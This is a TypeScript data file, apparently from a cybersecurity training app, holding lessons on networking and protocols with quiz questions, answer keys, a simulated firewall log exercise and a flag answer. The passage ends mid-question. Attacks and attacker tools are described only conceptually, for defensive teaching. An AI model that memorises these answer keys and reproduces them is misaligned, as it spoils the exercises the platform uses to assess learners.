import type { TelemetryEvent } from "@/lib/sim/types";

const rooms = [
  // ─────────────────────────────────────────────────────────────────────────────
  // ROOM 1: Networking Fundamentals
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: "networking-fundamentals",
    title: "Networking Fundamentals",
    description:
      "Learn how computer networks actually work — from sending your first packet to reading a suspicious connection log like a SOC analyst.",
    difficulty: "beginner" as const,
    category: "Network Security" as const,
    estimatedMinutes: 45,
    xp: 300,
    icon: "🌐",
    prerequisites: [],
    tasks: [
      {
        type: "reading" as const,
        id: "net-fund-r1",
        heading: "What Is a Network? The OSI Model & IP Addressing",
        content: `**What Is a Computer Network?**

Imagine the postal system. You write a letter, put it in an envelope, write the recipient's address, and hand it to the post office. The post office figures out the route — maybe it goes to a sorting facility, then a local office, then a delivery truck — and eventually the letter arrives. The recipient reads it and can write back.

A computer network works exactly the same way. Instead of letters, computers send **packets** — tiny chunks of data. Instead of a physical address, each device has an **IP address**. Instead of post offices and sorting facilities, the network has **routers** and **switches**. The rules that govern how all of this happens are called **protocols**.

Every time you open a website, send an email, or stream a video, billions of packets are flying back and forth across networks around the world — all following these rules.

**The OSI Model: A Blueprint for Communication**

Engineers needed a way to describe how computers talk to each other without everything being one tangled mess. In 1984, the International Organization for Standardization (ISO) published the **OSI model** (Open Systems Interconnection model). It divides network communication into **7 distinct layers**, each with a specific job. Think of it like an assembly line — each layer handles one part of the process and hands off to the next.

Here are the 7 layers, from bottom to top:

**Layer 1 — Physical:** The actual cables, fiber optic wires, radio waves (Wi-Fi), and electrical signals. This layer is about raw bits — 0s and 1s moving through a physical medium. Examples: Ethernet cable (Cat6), fiber optic, Wi-Fi radio signals.

**Layer 2 — Data Link:** Packages raw bits into **frames** and handles communication between devices on the *same* local network. This is where **MAC addresses** (Media Access Control addresses) live. Think of it as the "neighborhood delivery" layer — it gets data from one device to the next device on the same street. Examples: Ethernet, Wi-Fi (802.11), switches.

**Layer 3 — Network:** Handles logical addressing and **routing** — getting data across *multiple* networks to reach a destination anywhere in the world. This is where **IP addresses** live. Examples: IP (Internet Protocol), routers, ICMP (ping).

**Layer 4 — Transport:** Breaks data into segments, manages delivery, and handles error checking. This is where **TCP** and **UDP** live — the two protocols that decide whether delivery is guaranteed or fast. Think of it as the "shipping department" that tracks packages.

**Layer 5 — Session:** Manages the opening, maintaining, and closing of "sessions" between applications. For example, when you log into a website, a session is established and kept alive while you browse. Less visible but important.

**Layer 6 — Presentation:** Handles data formatting, encryption, and compression. When your browser decrypts an HTTPS website, that happens at this layer. Examples: TLS/SSL encryption, JPEG/PNG compression, ASCII encoding.

**Layer 7 — Application:** The layer your software actually uses. HTTP, DNS, SMTP (email), FTP — these all live at Layer 7. This is what you see as a user.

**Why Do SOC Analysts Care About OSI?**

When something goes wrong, analysts use the OSI model to narrow down the problem. A firewall blocking traffic? That's likely a Layer 3 or 4 issue. A website not loading despite the network being fine? Could be Layer 7. An attacker intercepting Wi-Fi traffic? Layer 2. The model gives you a structured way to think about attacks and defenses.

Many attacks target specific layers: DDoS attacks often flood Layer 3 or 4, SQL injection targets Layer 7, and ARP spoofing attacks Layer 2.

**IP Addressing: The Internet's Address System**

Every device on a network needs an address so data knows where to go. **IPv4** (Internet Protocol version 4) addresses look like this: **192.168.1.50**

An IPv4 address is 32 bits long, written as four groups of numbers (0–255) separated by dots. There are about 4.3 billion possible IPv4 addresses — which sounds like a lot, but the internet ran out of them, which is why **IPv6** was created (but IPv4 is still dominant in corporate networks).

**Public vs Private IP Addresses**

Not all IP addresses are the same. The internet authority (IANA) reserved certain ranges for private use — these addresses can only be used *inside* a private network (your office, your home) and are NOT routable on the public internet:

- **10.0.0.0 – 10.255.255.255** (Class A private: large enterprise networks)
- **172.16.0.0 – 172.31.255.255** (Class B private: medium networks)
- **192.168.0.0 – 192.168.255.255** (Class C private: home networks, small offices)

Everything outside those ranges is a **public IP address** — an address that can be reached from anywhere on the internet.

This matters enormously for SOC analysts. If you see a network connection going from **10.5.2.44** (private) to **185.220.101.45** (public), that's a connection going *out* to the internet. If you see connections between two private IPs, that's *internal* traffic. Different IP types require different levels of suspicion.

**CIDR Notation: Describing Networks**

You'll often see IP addresses written with a slash, like **192.168.1.0/24**. This is **CIDR notation** (Classless Inter-Domain Routing). The number after the slash tells you how many bits are the "network part" — the rest are available for individual hosts.

- **/24** means 256 addresses (192.168.1.0 – 192.168.1.255) — common home/office subnet
- **/16** means 65,536 addresses — a large enterprise network
- **/8** means 16 million addresses — massive networks

**MAC Addresses: The Hardware ID**

While IP addresses are logical (they can be reassigned), a **MAC address** (Media Access Control address) is burned into the hardware of a network interface card at the factory. It looks like: **00:1A:2B:3C:4D:5E**

MAC addresses are used for Layer 2 (local network) communication. When your laptop sends data to your home router, it uses the router's MAC address. Routers use IP addresses to get data across the internet, then MAC addresses for the final "last hop" delivery.

Attackers sometimes **spoof** (fake) their MAC address to bypass access controls — a technique called MAC spoofing, relevant to NAC (Network Access Control) systems.`,
      },
      {
        type: "reading" as const,
        id: "net-fund-r2",
        heading: "TCP vs UDP, Ports, and the Three-Way Handshake",
        content: `**TCP and UDP: Two Ways to Send Data**

At Layer 4 (Transport), two protocols dominate: **TCP** (Transmission Control Protocol) and **UDP** (User Datagram Protocol). They take completely different approaches to delivery.

**TCP — Reliable, Connection-Oriented**

TCP is like sending a certified letter with return receipt. Before any data is sent, TCP establishes a connection using a process called the **three-way handshake**:

1. **SYN** — The client sends a "synchronize" packet to the server: "I want to connect."
2. **SYN-ACK** — The server responds: "Okay, I got your request, I'm ready."
3. **ACK** — The client confirms: "Great, let's start."

After this handshake, data flows. TCP also guarantees that:
- Every packet is **acknowledged** — if the receiver doesn't confirm receipt, the sender retransmits
- Packets arrive **in order** — even if they travel different routes, TCP reassembles them
- Errors are **detected and corrected**

This reliability comes at a cost: speed. The overhead of acknowledgments and ordering slows things down slightly.

TCP is used for: web browsing (HTTP/HTTPS), email (SMTP), file transfers (FTP), SSH, database connections — anything where you cannot afford to lose data.

**Security note:** The three-way handshake is the target of a classic attack called a **SYN flood**. An attacker sends thousands of SYN packets but never completes the handshake, exhausting the server's connection table and causing a Denial of Service (DoS).

**UDP — Fast, Connectionless**

UDP is like shouting across a room. You send the message and hope it arrives — there's no confirmation, no handshake, no guaranteed order. This makes UDP much faster, which is perfect when speed matters more than perfection.

UDP is used for: video streaming (Netflix uses it), online gaming, VoIP (voice calls), DNS lookups, and live video conferencing. If one frame of video is lost, the stream just continues — a brief glitch is better than buffering.

**Security note:** UDP's lack of connection state makes it harder for firewalls to track. Attackers abuse this in **UDP amplification DDoS attacks** — sending a small spoofed UDP packet to a server that responds with a *huge* response directed at the victim.

**Ports: Apartment Numbers for Network Traffic**

Imagine a large apartment building (your computer). The building has one address (the IP address), but hundreds of apartments inside (ports). Mail for apartment 80 goes to the web server. Mail for apartment 22 goes to the SSH service. Mail for apartment 443 goes to the HTTPS service.

**Ports are numbers from 0 to 65,535.** They're divided into three ranges:

- **Well-Known Ports (0–1023):** Assigned to standard services by IANA (Internet Assigned Numbers Authority). These are the most important for analysts to memorize.
- **Registered Ports (1024–49151):** Used by applications (MySQL uses 3306, RDP uses 3389, etc.)
- **Dynamic/Ephemeral Ports (49152–65535):** Temporarily assigned by your OS when *you* initiate a connection (your browser picks a random high port to connect from)

**Critical ports every SOC analyst must memorize:**

- **Port 20/21** — FTP (File Transfer Protocol) — unencrypted file transfer
- **Port 22** — SSH (Secure Shell) — encrypted remote access
- **Port 23** — Telnet — unencrypted remote access (never use this!)
- **Port 25** — SMTP (Simple Mail Transfer Protocol) — email sending
- **Port 53** — DNS (Domain Name System) — name resolution
- **Port 80** — HTTP — unencrypted web traffic
- **Port 110** — POP3 — email retrieval
- **Port 143** — IMAP — email retrieval
- **Port 389** — LDAP — Active Directory directory services
- **Port 443** — HTTPS — encrypted web traffic
- **Port 445** — SMB — Windows file sharing (very frequently attacked!)
- **Port 3389** — RDP (Remote Desktop Protocol) — Windows remote desktop
- **Port 8080 / 8443** — Alternative web ports, often used by proxies or web apps

**Why Ports Matter for SOC Analysts**

Attackers love to hide malicious traffic by using unexpected ports. For example:
- A reverse shell connecting outbound on port 443 (HTTPS) looks like normal web traffic
- Malware phoning home on port 53 (DNS) is hard to block because DNS must work
- An attacker using RDP (port 3389) from the internet to an internal machine is a huge red flag

When you see a connection log, always check: is this port expected for this type of traffic? Is this the right protocol for this port? Mismatches are suspicious.`,
      },
      {
        type: "reading" as const,
        id: "net-fund-r3",
        heading: "Routing, Switching, NAT, and the SOC Analyst Perspective",
        content: `**Routers vs Switches: How Traffic Moves**

Think of your office building. Inside the building, an intercom system connects every room — that's the **switch**. It knows which room is which and routes internal messages efficiently. But to communicate with people *outside* the building, you need to go through the main switchboard that connects to the outside phone network — that's the **router**.

**Switches** operate at Layer 2 (Data Link). They connect devices within the *same* local network (LAN — Local Area Network). When your laptop sends data to a file server across the office, it probably goes through a switch. Switches use **MAC address tables** to learn which device is on which port, so they only send traffic where it needs to go (rather than broadcasting everything everywhere).

**Routers** operate at Layer 3 (Network). They connect *different* networks together — like connecting your office LAN to the internet, or your office in New York to your office in London via a VPN. Routers read IP addresses and use **routing tables** to decide the best path for each packet.

When you visit google.com, your packet travels through:
1. Your laptop → switch → your office router (LAN)
2. Your office router → your ISP's router (WAN — Wide Area Network)
3. Multiple internet routers (BGP routing across the internet backbone)
4. Google's edge router → Google's internal network → the web server

Each router along the way makes a forwarding decision: "This packet is destined for 142.250.80.46 — send it toward this next hop."

**NAT: Network Address Translation**

Here's a problem: there aren't enough public IPv4 addresses for every device in the world. Your home has 10 devices, but your ISP only gives you one public IP. How does this work?

The answer is **NAT (Network Address Translation)**. Your router maintains a translation table. When your laptop (192.168.1.5) sends a request to google.com:

1. Your router **replaces** the source IP (192.168.1.5) with your public IP (e.g., 203.0.113.50) and logs the mapping
2. Google sees the request coming from 203.0.113.50 and sends the response there
3. Your router receives the response, looks up the table, and forwards it back to 192.168.1.5

This is **Source NAT (SNAT)** or **PAT (Port Address Translation)**. Corporations use this extensively — thousands of internal devices share a handful of public IPs.

**Why NAT Matters for SOC Analysts**

NAT creates a challenge for attribution. In logs, you might see traffic coming from a public IP (203.0.113.50), but that could be ANY of the thousand devices behind that NAT. To find the actual device, you'd need the router's NAT log (which maps internal IPs to the public IP + port at a specific timestamp). This is a critical forensic step when investigating an incident.

**DHCP: Automatic IP Assignment**

You don't manually type your IP address every time you connect to a network — **DHCP (Dynamic Host Configuration Protocol)** handles this automatically. Here's what happens when you plug a laptop into the network:

1. Laptop broadcasts: "DISCOVER — is there a DHCP server?"
2. DHCP server responds: "OFFER — here's an IP you can use: 10.1.5.42"
3. Laptop accepts: "REQUEST — yes, I'll take that IP"
4. Server confirms: "ACK — it's yours for the next 8 hours (lease time)"

DHCP gives your device an IP address, subnet mask, default gateway (the router to use), and DNS server address. It works automatically in the background.

**Security implication:** A **rogue DHCP server** is a classic attack. An attacker plugs a device into the network and runs their own DHCP server. When your laptop asks for an IP, the attacker's server responds first and gives you a fake default gateway — now all your traffic flows through the attacker's machine. This is called a **DHCP starvation** or **DHCP poisoning** attack.

**The SOC Analyst's Networking Toolkit**

When you're investigating a security incident, these networking concepts form your foundation:

- **Unusual port usage:** Why is a machine connecting to something on port 4444 (common attacker reverse shell port)? Why is port 3389 (RDP) exposed to the internet?
- **Unexpected external connections:** A finance server should never initiate outbound connections to a random IP in another country
- **Private-to-private lateral movement:** If you see 10.1.2.33 making hundreds of connections to other 10.x.x.x addresses, someone might be scanning your internal network
- **NAT translation logs:** Critical for tracing which device made a suspicious connection when only a public IP is known
- **DHCP lease logs:** When you find a suspicious IP in a log, DHCP logs tell you which device (by MAC/hostname) had that IP at that time`,
      },
      {
        type: "question" as const,
        id: "net-fund-q1",
        question:
          "A SOC analyst sees this IP address in a firewall log as the source of an attack: 192.168.45.12. What type of IP address is this?",
        options: [
          "A public IP address — reachable from anywhere on the internet",
          "A private IP address — only usable within a local network",
          "An IPv6 address in shorthand notation",
          "A multicast address used for streaming",
        ],
        answer: 1,
        explanation:
          "192.168.45.12 falls within the 192.168.0.0–192.168.255.255 range, which is reserved for private networks. This means the attacker was on the *internal* network, not attacking from the outside. This changes the investigation significantly — it suggests an insider threat or a compromised internal device.",
        xp: 15,
      },
      {
        type: "question" as const,
        id: "net-fund-q2",
        question:
          "During an incident investigation, you see a workstation making a TCP connection to port 4444 on an external IP. The three-way handshake completed successfully. What does this tell you?",
        options: [
          "The connection was blocked by the firewall because port 4444 is reserved",
          "The workstation is only listening, not sending data",
          "A full TCP session was established — data was likely exchanged between the workstation and the external host",
          "The packet was rejected because UDP should be used on port 4444",
        ],
        answer: 2,
        explanation:
          "A completed three-way handshake (SYN → SYN-ACK → ACK) means a full TCP connection was established and data could flow in both directions. Port 4444 is commonly used by Metasploit reverse shells — this is a serious finding requiring immediate investigation.",
        xp: 15,
      },
      {
        type: "question" as const,
        id: "net-fund-q3",
        question:
          "Which OSI layer handles logical IP addressing and routing packets across multiple networks?",
        options: [
          "Layer 2 — Data Link (MAC addresses and switches)",
          "Layer 3 — Network (IP addresses and routers)",
          "Layer 4 — Transport (TCP/UDP and ports)",
          "Layer 7 — Application (HTTP, DNS, SMTP)",
        ],
        answer: 1,
        explanation:
          "Layer 3 (Network layer) handles logical addressing via IP addresses and the routing of packets between different networks. Routers operate at this layer. Layer 2 handles MAC addresses on the same local network, Layer 4 handles TCP/UDP ports, and Layer 7 handles application protocols.",
        xp: 15,
      },
      {
        type: "log_analysis" as const,
        id: "net-fund-la1",
        heading: "Suspicious Outbound Connection — Can You Spot It?",
        context:
          "You are a SOC analyst reviewing firewall logs from a corporate workstation. The company policy states that workstations should only connect outbound on ports 80 (HTTP), 443 (HTTPS), and 53 (DNS). All other outbound connections are unusual and require investigation. The following event was flagged by an automated rule.",
        event: {
          id: "evt-net-001",
          ts: "2025-11-14T02:47:33Z",
          source: "firewall" as const,
          event_type: "net_connection" as const,
          severity: "high" as const,
          hostname: "CORP-WS-0047",
          src_ip: "10.5.12.47",
          dst_ip: "185.220.101.34",
          dst_port: 4444,
          description:
            "Outbound TCP connection established to external host on non-standard port",
          raw: {
            action: "allow",
            protocol: "TCP",
            src_ip: "10.5.12.47",
            src_port: 51234,
            dst_ip: "185.220.101.34",
            dst_port: 4444,
            bytes_sent: 2048,
            bytes_received: 8192,
            connection_state: "ESTABLISHED",
            duration_sec: 347,
            hostname: "CORP-WS-0047",
            username: "jsmith",
            rule_matched: "DEFAULT-ALLOW-OUTBOUND",
            timestamp: "2025-11-14T02:47:33Z",
            nat_src_ip: "203.0.113.15",
            nat_src_port: 51234,
            geo_dst_country: "RU",
          },
        },
        questions: [
          {
            question:
              "What is the destination port of this connection, and why is it suspicious?",
            options: [
              "Port 443 — suspicious because HTTPS should use port 80 instead",
              "Port 4444 — suspicious because this is not an approved outbound port and is commonly used by attacker tools like Metasploit reverse shells",
              "Port 51234 — suspicious because high ports should never be used for outbound connections",
              "Port 8080 — suspicious because web traffic should only use port 80",
            ],
            answer: 1,
            explanation:
              "The destination port is 4444 (visible in dst_port field). Port 4444 is NOT in the approved list of 80, 443, and 53. Critically, port 4444 is the default listener port for Metasploit's Meterpreter reverse shell — one of the most commonly used attacker tools. The connection lasted 347 seconds and the destination is in Russia (geo_dst_country: RU), making this highly suspicious.",
            xp: 20,
          },
          {
            question:
              "The log shows src_ip: 10.5.12.47 and nat_src_ip: 203.0.113.15. What does this tell you?",
            options: [
              "There are two attackers — one at each IP address",
              "The workstation has two network interfaces",
              "NAT translation occurred — the workstation's private IP (10.5.12.47) was translated to the company's public IP (203.0.113.15) as traffic left the network",
              "The connection was blocked because the NAT failed",
            ],
            answer: 2,
            explanation:
              "This is NAT in action. The workstation uses the private IP 10.5.12.47 internally. The firewall's NAT function translates this to the company's public IP 203.0.113.15 before sending traffic to the internet. The external server (185.220.101.34) only sees 203.0.113.15, not the internal IP. This is standard corporate NAT operation.",
            xp: 20,
          },
        ],
      },
      {
        type: "flag" as const,
        id: "net-fund-f1",
        prompt:
          "Looking at the firewall log above — the suspicious connection from CORP-WS-0047. What is the exact destination port number that the connection was made to? Enter the port number only.",
        answer: "4444",
        hint: "Look for the dst_port field in the raw log data.",
        xp: 25,
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // ROOM 2: Common Network Protocols
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: "networking-protocols",
    title: "Common Network Protocols",
    description:
      "Dive deep into the protocols that power the internet — and learn how attackers exploit each one.",
    difficulty: "beginner" as const,
    category: "Network Security" as const,
    estimatedMinutes: 40,
    xp: 300,
    icon: "📡",
    prerequisites: ["networking-fundamentals"],
    tasks: [
      {
        type: "reading" as const,
        id: "net-prot-r1",
        heading: "HTTP/HTTPS, DNS, and DHCP — The Web's Foundation",
        content: `**HTTP and HTTPS: How Web Pages Travel to Your Browser**

When you type "www.google.com" into your browser and press Enter, a remarkable series of events happens in milliseconds. The protocol that carries web pages is **HTTP** (HyperText Transfer Protocol), and its secure version is **HTTPS** (HTTP Secure).

Think of HTTP like sending a postcard — anyone who handles the mail can read everything on it. HTTPS is like putting that postcard in a sealed, tamper-evident envelope. Same information, dramatically different security.

**How HTTP works:**
1. Your browser sends an **HTTP request** to the web server: "GET /index.html HTTP/1.1"
2. The server processes the request and sends back an **HTTP response**: "HTTP/1.1 200 OK" followed by the web page content
3. HTTP request methods include: GET (retrieve something), POST (send data, like a login form), PUT (update), DELETE (remove)
4. HTTP status codes tell you what happened: 200 = OK, 301 = Redirect, 403 = Forbidden, 404 = Not Found, 500 = Server Error

HTTP runs on **port 80**. The problem: everything is sent as plain text. Passwords, credit card numbers, session tokens — all readable by anyone on the network who can capture traffic (called a **man-in-the-middle attack**).

**HTTPS: Adding Encryption via TLS**

**HTTPS** combines HTTP with **TLS** (Transport Layer Security — the modern replacement for the older SSL, Secure Sockets Layer). Before any web content is sent, TLS performs a **TLS handshake**:

1. Browser says: "I want a secure connection, here are the encryption methods I support"
2. Server responds with its **digital certificate** (like an ID card, issued by a trusted Certificate Authority)
3. Browser verifies the certificate is legitimate and not expired
4. Both sides agree on encryption keys using **asymmetric cryptography**
5. Subsequent communication is encrypted with a fast symmetric key

HTTPS runs on **port 443**. A padlock icon in your browser's address bar means TLS is active.

**Why HTTPS matters for security:**
- Prevents eavesdropping (no one can read the content in transit)
- Prevents tampering (any modification would be detected)
- Provides authentication (you know you're talking to the real server, not a fake)

**SOC note:** Attackers increasingly use HTTPS for malware C2 (Command and Control) communication because it blends in with normal traffic and many firewalls can't inspect encrypted content without SSL inspection. Seeing outbound HTTPS to unusual IPs/domains is a common detection challenge.

**DNS: The Internet's Phone Book**

Humans remember "google.com" but computers communicate using IP addresses like 142.250.80.46. **DNS** (Domain Name System) is the system that translates between these two.

When you type "gmail.com" into your browser:
1. Your computer checks its local DNS cache — did I look this up recently?
2. If not, it asks your **recursive resolver** (usually your ISP or corporate DNS server): "What's the IP for gmail.com?"
3. The resolver queries the **root DNS servers** (13 sets of servers that know who manages each top-level domain)
4. The root server says: "For .com, ask Verisign's nameservers"
5. Verisign's server says: "For gmail.com, ask Google's nameservers"
6. Google's nameserver responds: "gmail.com is at 142.250.80.46"
7. Your browser connects to 142.250.80.46

This whole process typically takes under 50 milliseconds. DNS uses **port 53** (UDP for most queries, TCP for large responses).

**DNS Record Types** (know these for SOC work):
- **A record:** Maps a domain to an IPv4 address (gmail.com → 142.250.80.46)
- **AAAA record:** Maps a domain to an IPv6 address
- **CNAME record:** Alias from one domain to another (mail.company.com → company.com)
- **MX record:** Mail eXchange — which server handles email for this domain
- **TXT record:** Text data — used for SPF/DKIM email verification, domain ownership proofs
- **PTR record:** Reverse lookup — IP address → domain name

**DNS Security Threats:**
- **DNS cache poisoning:** Attacker injects fake DNS responses so your DNS cache stores wrong IP addresses (you type "bank.com" and get sent to a fake site)
- **DNS tunneling:** Attackers encode data inside DNS queries/responses to exfiltrate data or communicate with malware — DNS is often not blocked by firewalls, making it attractive for covert channels
- **DGA (Domain Generation Algorithms):** Malware generates hundreds of random-looking domain names (e.g., "xk3r9qlp.com") and tries to connect to them. It's hard to block because the domains change constantly. SOC analysts watch for DNS queries to random-looking domains.
- **DNS over HTTPS (DoH):** Encrypts DNS queries — great for privacy, but can blind security monitoring tools

**DHCP: Automatic IP Assignment (and Its Risks)**

**DHCP** (Dynamic Host Configuration Protocol) runs on **port 67 (server) and 68 (client)**. When a device joins a network, it uses DHCP to automatically get an IP address — the full process is called **DORA**: Discover, Offer, Request, Acknowledge.

Beyond just the IP address, DHCP tells your device:
- The subnet mask (what's the local network?)
- The default gateway (which router to use?)
- The DNS server address (who to ask for name resolution?)
- The lease duration (how long can you keep this IP?)

**DHCP attack — Rogue DHCP Server:** An attacker connects a device to your network and runs a DHCP server faster than yours. When your laptop asks for network configuration, the attacker's server answers first and provides a fake gateway IP — their laptop. Now all your network traffic flows through the attacker's device before going anywhere. This is called a **man-in-the-middle attack via DHCP poisoning**.

Detection: DHCP servers should only appear on specific authorized devices. If your monitoring shows DHCP responses coming from an unexpected IP or MAC address, that's a critical alert.`,
      },
      {
        type: "reading" as const,
        id: "net-prot-r2",
        heading: "SSH, SMB, RDP, FTP, and Email Protocols",
        content: `**SSH: Secure Remote Access**

Before SSH, administrators used **Telnet** (port 23) to remotely manage servers. Telnet sends everything — including passwords — as plain text. Anyone capturing network traffic could see exactly what you typed. It was like broadcasting your password on a loudspeaker.

**SSH** (Secure Shell), running on **port 22**, solved this by encrypting the entire session. When you SSH into a server, all keystrokes, command output, and credentials are encrypted using public-key cryptography.

**How SSH authentication works:**
- **Password authentication:** You type a password (encrypted over the tunnel) — functional but vulnerable to brute force
- **Public key authentication:** You generate a **key pair** — a private key (kept secret on your computer) and a public key (placed on the server). When you connect, the server challenges you to prove you have the private key, without ever transmitting it. Much more secure.

**SSH security concerns:**
- **SSH brute force attacks:** Automated tools try thousands of username/password combinations against port 22. Any server with SSH exposed to the internet should use key-based auth and disable password auth.
- **Exposed port 22:** Honeypot data shows that a new server exposed to the internet gets its first SSH brute-force attempt within minutes. If you see thousands of auth_failure events from various IPs on port 22, that's a brute-force attack.
- **SSH tunneling:** Attackers can tunnel other protocols through SSH to bypass firewall rules — "SSH port forwarding" can create encrypted tunnels for any traffic.

**SMB: Windows File Sharing (and a Hacker Favorite)**

**SMB** (Server Message Block) is Microsoft's file-sharing protocol, running on **port 445** (and legacy port 139). It's how Windows machines share files, printers, and communicate with Active Directory servers.

SMB is also one of the most exploited protocols in history:
- **EternalBlue (MS17-010):** A critical vulnerability in SMB v1 was discovered by the NSA and later leaked. It allowed unauthenticated remote code execution. The **WannaCry** ransomware (May 2017) used EternalBlue to spread to 200,000+ computers in 150 countries within hours. **NotPetya**, which caused over $10 billion in damage, used the same exploit. If you ever see port 445 traffic between machines that shouldn't be communicating, take it very seriously.
- **SMB relay attacks:** Attackers intercept SMB authentication and relay it to other servers
- **SMB brute force:** Like SSH, SMB is targeted by password-guessing attacks

SOC rule: Port 445 traffic from workstations to workstations (not to file servers) is highly suspicious and often indicates lateral movement using SMB.

**RDP: Remote Desktop Protocol**

**RDP** (Remote Desktop Protocol) runs on **port 3389** and allows users to see and control a Windows computer's graphical desktop remotely — as if you were sitting in front of it.

RDP is extremely useful for IT administrators and remote workers, which is why it's also extremely attractive to attackers:

- **BlueKeep (CVE-2019-0708):** A critical unauthenticated RDP vulnerability that allowed remote code execution. Microsoft warned it could be "wormable" like WannaCry. Patched in 2019 but many unpatched systems still exist.
- **DejaBlue (CVE-2019-1181/1182):** Similar class of RDP vulnerability
- **RDP brute force:** Port 3389 exposed to the internet is one of the top entry points for ransomware operators. Tools like **Hydra** and **NLBrute** automate password guessing.
- **Credential stuffing:** Using leaked username/password combinations from data breaches to try RDP logins

SOC detection: Multiple auth_failure events on port 3389 from external IPs = RDP brute force attack. A single auth_success after many failures = successful brute force — incident!

**FTP and SFTP: File Transfer Protocols**

**FTP** (File Transfer Protocol) uses ports 20 (data) and 21 (control). It was designed in 1971 and shows its age: **all data, including usernames and passwords, is sent as plain text**. FTP should never be used on a modern network.

**SFTP** (SSH File Transfer Protocol) or **FTPS** (FTP over SSL/TLS) are the secure alternatives. SFTP runs on **port 22** (it's a subsystem of SSH).

Attackers sometimes set up FTP servers to exfiltrate stolen data — look for unexpected FTP connections in firewall logs.

**Email Protocols: SMTP, IMAP, POP3**

Email uses multiple protocols for different stages of delivery:

- **SMTP** (Simple Mail Transfer Protocol) — port 25 (server-to-server) or port 587 (client submission): Used to *send* email. Your email client sends outgoing mail to your mail server via SMTP, and mail servers use SMTP to pass email to each other across the internet.
- **POP3** (Post Office Protocol 3) — port 110 (or 995 for SSL): Downloads email from server to your device and deletes from server. Old-fashioned.
- **IMAP** (Internet Message Access Protocol) — port 143 (or 993 for SSL): Syncs email across multiple devices — email stays on server. Modern standard.

Email attacks at the protocol level:
- **Open SMTP relay:** A mail server that allows anyone to send mail through it — abused massively for spam and phishing
- **SMTP spoofing:** Forging the sender address in email headers — why your CEO's "urgent wire transfer" email should always be verified by phone

**ICMP: Ping and Its Abuses**

**ICMP** (Internet Control Message Protocol) is the protocol behind **ping** — it sends an "echo request" and expects an "echo reply." It's used for network diagnostics and the **traceroute** tool (which shows the path your packets take across the internet).

ICMP has no ports — it's at Layer 3, directly on top of IP. It's often allowed through firewalls for diagnostic purposes, which attackers exploit:

- **ICMP tunneling:** Data can be encoded inside ICMP echo packets to create a covert communication channel that bypasses firewalls
- **Ping flood:** Overwhelming a target with ICMP requests (old-school DDoS)
- **ICMP redirect attacks:** Forged ICMP redirect messages can be used to manipulate routing tables`,
      },
      {
        type: "reading" as const,
        id: "net-prot-r3",
        heading: "Protocol Security: Which Protocols Are Dangerous and Why",
        content: `**The Protocol Risk Spectrum**

Not all protocols are created equal from a security standpoint. Understanding which protocols are inherently insecure, which can be made secure, and which are commonly abused helps SOC analysts prioritize their monitoring and investigation.

**The "Never Use Unencrypted" List**

These protocols transmit data (including credentials) in plain text and should be replaced by their secure equivalents:

- **Telnet (port 23)** → Replace with SSH (port 22)
- **FTP (ports 20/21)** → Replace with SFTP (port 22) or FTPS (port 990)
- **HTTP (port 80)** for sensitive sites → Replace with HTTPS (port 443)
- **POP3 (port 110)** → Use POP3S (port 995)
- **IMAP (port 143)** → Use IMAPS (port 993)
- **SMTP (port 25)** for client submission → Use port 587 with STARTTLS or 465 with SSL

If you see authentication traffic on these unencrypted ports, someone's credentials are flowing in plain text — a serious finding.

**Protocols That Are Frequently Abused for Attacks**

**DNS (port 53):** Nearly universally allowed through firewalls — even strict security environments need DNS. Attackers abuse this:
- **DNS tunneling tools** like iodine, dnscat2, and dns2tcp encode data inside DNS queries
- **DGA malware** (Domain Generation Algorithms) — malware families like Conficker, CryptoLocker variants, and Necurs generate thousands of random domains daily and try to reach them. Only one domain needs to work for the attacker.
- Detection: High volume of DNS queries to random-looking domains, DNS queries with unusually long subdomains, DNS over unusual IPs (not your corporate DNS servers)

**SMB (port 445):** The #1 protocol for lateral movement in enterprise attacks. Modern ransomware groups including **LockBit**, **BlackCat/ALPHV**, and **Conti** used SMB heavily for spreading within networks. After initial access, attackers map SMB shares across the network to find valuable data.

**RDP (port 3389):** The #1 initial access vector for ransomware according to multiple threat intelligence reports. Exposed RDP = huge risk. Even behind VPN, RDP should be closely monitored.

**HTTPS (port 443):** Paradoxically, encrypted traffic can be a security problem. C2 (Command and Control) frameworks like **Cobalt Strike**, **Sliver**, and **Havoc** all support HTTPS C2 to blend in with normal web traffic. Without SSL/TLS inspection, these connections look identical to legitimate HTTPS traffic.

**Understanding Protocol Context**

A key SOC analyst skill is understanding whether a protocol makes sense in context. Ask yourself:

1. **Should this device be using this protocol?** A database server initiating HTTP requests is unusual. A workstation using SMB to connect to another workstation (not a file server) is suspicious.

2. **Should this port be open?** RDP should never be open to the internet unless through a VPN or jump server. Telnet should never exist.

3. **Is the timing unusual?** DNS queries at 3 AM in regular intervals (like every 60 seconds) might be malware checking in with its C2 server (called **beaconing**).

4. **Is the destination expected?** An internal server making DNS queries to an external DNS server (bypassing your corporate DNS) might be trying to use DNS tunneling or bypass security controls.

**The SOC Analyst's Protocol Checklist**

When investigating an alert involving a network connection, ask:
- What protocol/port is being used?
- Is this an encrypted or unencrypted protocol?
- Does the source device normally use this protocol?
- Is the destination expected for this type of traffic?
- What time did this occur? Is timing unusual?
- What's the volume? (One DNS query is fine; 10,000 DNS queries per minute is not)
- Has this IP/domain been seen before? Is it in threat intelligence feeds?

These questions form the foundation of network-based threat investigation.`,
      },
      {
        type: "question" as const,
        id: "net-prot-q1",
        question:
          "An attacker compromises a web server and wants to exfiltrate data without being detected by the firewall, which allows only port 53, 80, and 443 outbound. Which technique would most likely succeed?",
        options: [
          "FTP exfiltration on port 21 — firewalls never block FTP",
          "DNS tunneling through port 53 — DNS is almost always allowed and can carry encoded data",
          "Telnet on port 23 — Telnet is faster than SSH for data transfer",
          "RDP on port 3389 — remote desktop can transfer files",
        ],
        answer: 1,
        explanation:
          "DNS tunneling through port 53 is the correct answer. DNS is allowed almost everywhere because blocking it would break internet connectivity. Tools like dnscat2 and iodine encode data inside DNS query subdomains. Each DNS query can carry ~200 bytes of data — slow, but effective for stealing credentials or configuration files. This is why SOC teams monitor for unusual DNS query patterns and high-entropy domain names.",
        xp: 15,
      },
      {
        type: "question" as const,
        id: "net-prot-q2",
        question:
          "A SOC analyst sees 847 authentication failure events from IP 45.33.32.156 targeting port 3389 on a corporate server over 2 minutes, followed by 1 authentication success. What most likely happened?",
        options: [
          "A legitimate user forgot their password multiple times before getting it right",
          "The server's RDP service restarted, causing temporary failures",
